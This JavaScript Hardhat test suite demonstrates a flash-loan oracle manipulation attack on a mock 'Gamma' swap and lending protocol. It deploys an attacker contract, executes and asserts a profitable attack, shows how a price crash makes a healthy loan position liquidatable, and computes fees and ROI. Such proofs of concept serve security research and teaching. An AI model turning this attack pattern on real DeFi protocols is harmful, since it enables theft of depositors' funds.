const { expect } = require('chai');
const { ethers } = require('hardhat');

/**
 * Flash Loan Oracle Manipulation Test Suite
 * Tests oracle manipulation attack on Gamma swap protocol
 */
describe('Flash Loan Oracle Manipulation Attack', function () {
    let gammaToken, gammaSwap, gammaOracle, gammaLending, attacker;
    let owner, user, liquidator;
    
    const INITIAL_LIQUIDITY_GAMMA = ethers.parseEther('1000000'); // 1M GAMMA
    const INITIAL_LIQUIDITY_ETH = ethers.parseEther('100'); // 100 ETH
    const ATTACK_AMOUNT = ethers.parseEther('5000000'); // 5M GAMMA for attack
    
    beforeEach(async function () {
        [owner, user, liquidator] = await ethers.getSigners();
        
        // Deploy contracts
        const GammaToken = await ethers.getContractFactory('GammaToken');
        gammaToken = await GammaToken.deploy();
        
        const GammaSwap = await ethers.getContractFactory('GammaSwap');
        gammaSwap = await GammaSwap.deploy(await gammaToken.getAddress());
        
        const GammaOracle = await ethers.getContractFactory('GammaOracle');
        gammaOracle = await GammaOracle.deploy(await gammaSwap.getAddress());
        
        const GammaLending = await ethers.getContractFactory('GammaLending');
        gammaLending = await GammaLending.deploy(
            await gammaToken.getAddress(),
            await gammaOracle.getAddress()
        );
        
        // Setup initial liquidity
        await gammaToken.approve(await gammaSwap.getAddress(), INITIAL_LIQUIDITY_GAMMA);
        await gammaSwap.addLiquidity(INITIAL_LIQUIDITY_GAMMA, { value: INITIAL_LIQUIDITY_ETH });
        
        // Fund lending protocol
        await owner.sendTransaction({
            to: await gammaLending.getAddress(),
            value: ethers.parseEther('50')
        });
        
        // Deploy attacker contract
        const FlashLoanAttacker = await ethers.getContractFactory('FlashLoanAttacker');
        attacker = await FlashLoanAttacker.deploy(
            await gammaSwap.getAddress(),
            await gammaOracle.getAddress(),
            await gammaLending.getAddress(),
            await gammaToken.getAddress()
        );
        
        // Fund attacker
        await gammaToken.transfer(await attacker.getAddress(), ATTACK_AMOUNT);
    });
    
    describe('Vulnerable Oracle Attack', function () {
        it('Should demonstrate successful flash loan oracle manipulation', async function () {
            console.log('\n=== FLASH LOAN ORACLE MANIPULATION ATTACK ===\n');
            
            // Step 1: Record initial state
            const priceBeforeAttack = await gammaOracle.getPrice();
            const attackerETHBefore = await ethers.provider.getBalance(owner.address);
            const attackerGammaBefore = await gammaToken.balanceOf(owner.address);
            
            console.log('Initial State:');
            console.log('- GAMMA Price:', ethers.formatEther(priceBeforeAttack), 'GAMMA per ETH');
            console.log('- Attacker ETH:', ethers.formatEther(attackerETHBefore));
            console.log('- Attacker GAMMA:', ethers.formatEther(attackerGammaBefore));
            
            // Step 2: Simulate attack
            const simulation = await attacker.simulateAttack(ATTACK_AMOUNT);
            
            console.log('\nAttack Simulation:');
            console.log('- Price before:', ethers.formatEther(simulation[0]), 'GAMMA per ETH');
            console.log('- Price after manipulation:', ethers.formatEther(simulation[1]), 'GAMMA per ETH');
            console.log('- Price manipulation:', 
                ((simulation[0] - simulation[1]) * 100n / simulation[0]).toString() + '%');
            console.log('- Estimated profit:', ethers.formatEther(simulation[3]), 'ETH');
            
            // Step 3: Execute attack
            await attacker.executeAttack(ATTACK_AMOUNT, { value: ethers.parseEther('1') });
            
            // Step 4: Verify results
            const priceAfterAttack = await gammaOracle.getPrice();
            const attackerETHAfter = await ethers.provider.getBalance(owner.address);
            const attackerGammaAfter = await gammaToken.balanceOf(owner.address);
            
            const ethProfit = attackerETHAfter - attackerETHBefore;
            const gammaProfit = attackerGammaAfter > attackerGammaBefore ? 
                attackerGammaAfter - attackerGammaBefore : 0n;
            
            console.log('\nAttack Results:');
            console.log('- Final price:', ethers.formatEther(priceAfterAttack), 'GAMMA per ETH');
            console.log('- ETH Profit:', ethers.formatEther(ethProfit));
            console.log('- GAMMA Profit:', ethers.formatEther(gammaProfit));
            console.log('\n=== ATTACK SUCCESSFUL ===\n');
            
            // Verify attack was profitable
            expect(ethProfit).to.be.gt(0);
        });
        
        it('Should show price manipulation impact on lending', async function () {
            console.log('\n=== LENDING PROTOCOL EXPLOITATION ===\n');
            
            // User deposits collateral at normal price
            const collateralAmount = ethers.parseEther('10000');
            await gammaToken.transfer(user.address, collateralAmount);
            await gammaToken.connect(user).approve(await gammaLending.getAddress(), collateralAmount);
            await gammaLending.connect(user).deposit(collateralAmount);
            
            const healthBefore = await gammaLending.getPositionHealth(user.address);
            console.log('User position health before attack:', healthBefore.toString() + '%');
            
            // Attacker manipulates price
            await gammaToken.approve(await gammaSwap.getAddress(), ATTACK_AMOUNT);
            await gammaSwap.swapGammaForETH(ATTACK_AMOUNT);
            
            const priceAfterManipulation = await gammaOracle.getPrice();
            const healthAfter = await gammaLending.getPositionHealth(user.address);
            
            console.log('Price after manipulation:', ethers.formatEther(priceAfterManipulation));
            console.log('User position health after attack:', healthAfter.toString() + '%');
            console.log('Position became undercollateralized:', healthAfter < 120n);
            
            // Attacker can now liquidate healthy position
            if (healthAfter < 120n) {
                console.log('\n⚠️  Healthy position can be liquidated due to price manipulation!');
            }
            
            console.log('\n=== LENDING PROTOCOL VULNERABLE ===\n');
        });
    });
    
    describe('Attack Profitability Analysis', function () {
        it('Should calculate attack costs and profits', async function () {
            console.log('\n=== ATTACK PROFITABILITY ANALYSIS ===\n');
            
            const simulation = await attacker.simulateAttack(ATTACK_AMOUNT);
            
            const priceImpact = ((simulation[0] - simulation[1]) * 10000n / simulation[0]);
            const estimatedProfit = simulation[3];
            
            console.log('Attack Parameters:');
            console.log('- Attack size:', ethers.formatEther(ATTACK_AMOUNT), 'GAMMA');
            console.log('- Price impact:', (priceImpact / 100n).toString() + '%');
            console.log('- Estimated profit:', ethers.formatEther(estimatedProfit), 'ETH');
            
            // Calculate costs
            const swapFee = ATTACK_AMOUNT * 3n / 1000n; // 0.3% fee
            const flashLoanFee = ATTACK_AMOUNT * 9n / 10000n; // 0.09% fee
            
            console.log('\nAttack Costs:');
            console.log('- Swap fees:', ethers.formatEther(swapFee), 'GAMMA');
            console.log('- Flash loan fees:', ethers.formatEther(flashLoanFee), 'GAMMA');
            console.log('- Gas costs: ~0.5 ETH (estimated)');
            
            const netProfit = estimatedProfit - ethers.parseEther('0.5');
            console.log('\nNet Profit:', ethers.formatEther(netProfit), 'ETH');
            console.log('ROI:', ((netProfit * 100n) / ethers.parseEther('0.5')).toString() + '%');
            
            console.log('\n=== ATTACK HIGHLY PROFITABLE ===\n');
        });
    });
});